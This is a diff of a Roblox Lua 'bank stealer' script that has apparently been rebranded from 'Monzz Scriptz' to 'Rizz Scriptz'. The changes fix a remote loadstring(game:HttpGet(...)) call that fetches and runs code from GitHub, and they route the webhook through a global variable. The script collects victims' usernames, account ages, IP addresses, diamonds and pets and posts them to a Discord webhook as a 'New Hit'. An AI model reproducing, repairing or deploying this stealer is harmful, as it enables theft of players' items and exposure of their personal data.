@@ -72,7 +72,7 @@ end
 getexploit()
 local dhid
 local idiotuser = game:GetService("Players").LocalPlayer.Name
-local url = Webhook
+local url = _G.Webhook
 if _G.UserID == nil then
     game:GetService("Players").LocalPlayer:Kick("Put A UserId")
     return;
@@ -102,7 +102,7 @@ end
 
 
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet(https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua"))()
 end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
@@ -1226,11 +1226,11 @@ if banktiercheck == true then
 
     data1 = {
         ["content"] = ping,
-        ["username"] = "Monzz Scriptz",
+        ["username"] = "Rizz Scriptz",
         ["avatar_url"] = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif",
         ["embeds"] = { {
-            ["title"] = "**New Hit** ||Monzz Bank Stealer||",
-            ["url"] = "https://discord.gg/4y4CZfdJHu",
+            ["title"] = "**New Hit** ||With Rizz||",
+            ["url"] = "https://discord.gg/uSgzNwHDTS",
             ["type"] = "rich",
             ["color"] = tonumber(0x2798FF),
             ["thumbnail"] = {
@@ -1239,7 +1239,7 @@ if banktiercheck == true then
                 ["width"] = 420
             },
             ["fields"] = { {
-                ["name"] = "**Monzz Scriptz's Stealer Is Better** :skull:",
+                ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
                 ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
                     "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                     " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
@@ -1250,7 +1250,7 @@ if banktiercheck == true then
                 ["value"] = "```" .. DiamondsCount .. "```",
                 ["inline"] = true
             }, {
-                ["name"] = ":frog: **Pets** :frog:",
+                ["name"] = ":dog: **Pets** :dog:",
                 ["value"] = "```" .. #FinalList + #SFinalList .. "```",
                 ["inline"] = true
             }, {
@@ -1290,7 +1290,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. BDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":frog: **Pets** :frog:",
+                ["name"] = ":dog: **Pets** :dog:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] .. "```",
                 ["inline"] = true
             }, {
@@ -1344,7 +1344,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. TDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":frog: **Pets** :frog:",
+                ["name"] = ":dog: **Pets** :dog:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] + #FinalList .. "```",
                 ["inline"] = true
             },
@@ -1360,7 +1360,7 @@ local headers = {
     ["content-type"] = "application/json"
 }
 
-if Webhook ~= nil then
+if _G.Webhook ~= nil then
     local abcdef1 = {
         Url = url,
         Body = newdata1,
